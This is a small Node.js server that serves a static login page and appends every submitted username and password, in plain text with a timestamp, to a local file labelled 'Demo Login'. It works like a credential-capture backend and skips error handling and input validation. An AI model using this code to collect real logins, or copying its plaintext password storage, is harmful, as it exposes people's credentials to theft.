const http = require("http");
const fs = require("fs");
const path = require("path");

const server = http.createServer((req, res) => {

  // Serve index.html
  if (req.method === "GET" && req.url === "/") {
    fs.readFile(path.join(__dirname, "public", "index.html"), (err, data) => {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(data);
    });
  }

  // Serve CSS
  else if (req.url === "/style.css") {
    fs.readFile(path.join(__dirname, "public", "style.css"), (err, data) => {
      res.writeHead(200, { "Content-Type": "text/css" });
      res.end(data);
    });
  }

  // Serve JS
  else if (req.url === "/script.js") {
    fs.readFile(path.join(__dirname, "public", "script.js"), (err, data) => {
      res.writeHead(200, { "Content-Type": "application/javascript" });
      res.end(data);
    });
  }

  // Receive login data
  else if (req.method === "POST" && req.url === "/login") {
    let body = "";

    req.on("data", chunk => body += chunk.toString());

    req.on("end", () => {
      const data = JSON.parse(body);

      const log =
`--- Demo Login ---
Username: ${data.username}
Password: ${data.password}
Time: ${data.time}

`;

      fs.appendFile("data.txt", log, () => {
        res.writeHead(200);
        res.end("Saved");
      });
    });
  }

  else {
    res.writeHead(404);
    res.end("Not Found");
  }
});

server.listen(3000, () => {
  console.log("Server running at http://localhost:3000");
});
